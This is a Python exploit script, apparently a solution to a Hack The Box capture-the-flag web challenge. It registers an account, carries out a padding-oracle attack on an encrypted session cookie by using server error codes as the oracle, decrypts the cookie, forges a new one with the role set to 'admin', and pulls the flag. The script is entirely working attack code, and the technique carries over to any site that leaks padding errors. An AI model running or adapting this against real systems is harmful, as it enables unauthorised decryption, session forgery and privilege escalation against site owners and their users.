#!/usr/bin/env python3

import requests

from pwn import b64d, b64e, log, re, sys, xor
from urllib.parse import quote, unquote


def oracle(cookie: str) -> bool:
    global url
    global phpsessid

    r = requests.get(f'{url}/profile.php', cookies={
        'PHPSESSID': phpsessid,
        'iknowmag1k': cookie
    })

    return r.status_code != 500


def main():
    global url
    global phpsessid

    if len(sys.argv) != 2:
        print(f'Usage: python3 {sys.argv[0]} <host:port>')
        exit(1)

    url = f'http://{sys.argv[1]}'

    s = requests.session()
    s.post(f'{url}/register.php', data={
        'username': 'asdf',
        'email': 'asdf@asdf.com',
        'password': 'asdffdsa',
        'confirm': 'asdffdsa'
    })

    s.post(f'{url}/login.php', data={
        'username': 'asdf',
        'password': 'asdffdsa',
    })

    phpsessid = s.cookies['PHPSESSID']
    iknowmag1k = s.cookies['iknowmag1k']

    log.info(f'PHPSESSID: {phpsessid}')
    log.info(f'iknowmag1k: {iknowmag1k}')

    iknowmag1k = b64d(unquote(iknowmag1k))
    blocks = [iknowmag1k[i:i + 8] for i in range(0, len(iknowmag1k), 8)]

    plaintext = b''

    dec_prog = log.progress('Decrypted')
    enc_prog = log.progress('Encrypted')
    poa = log.progress('Bytes')

    def decrypt_block(ct_block: bytes) -> bytes:
        dec = [0] * 8
        k = []
        poa.status('0 / 8')

        for i in range(8):
            for b in range(256):
                block = bytes([0] * (7 - i) + [b] + k)
                cookie = quote(b64e(block + ct_block))

                if oracle(cookie):
                    poa.status(f'{i + 1} / 8')
                    dec[7 - i] = b ^ (i + 1)
                    k = [(i + 2) ^ dec[7 - j] for j in range(i + 1)][::-1]
                    break

        return bytes(dec)

    for m in range(len(blocks) - 1):
        current_block = blocks[-1 - m]
        prev_block = blocks[-2 - m]

        dec = decrypt_block(current_block)

        plaintext = xor(dec, prev_block) + plaintext
        dec_prog.status(str(plaintext))

    dec_prog.success(str(plaintext))

    want = b'{"user":"asdf","role":"admin"}\x02\x02'
    ct = b'\0' * 8
    encrypted = b''

    while want:
        block, want = want[-8:], want[:-8]
        dec = decrypt_block(ct[:8])
        ct = xor(bytes(dec), block) + ct
        assert oracle(quote(b64e(ct)))
        encrypted = block + encrypted
        enc_prog.status(str(encrypted))

    cookie = quote(b64e(ct))

    poa.success()
    enc_prog.success(cookie)

    r = requests.get(f'{url}/profile.php', cookies={
        'PHPSESSID': phpsessid,
        'iknowmag1k': cookie
    })

    log.success('Flag: ' + re.findall(r'HTB\{.*?\}', r.text)[0])


if __name__ == '__main__':
    main()
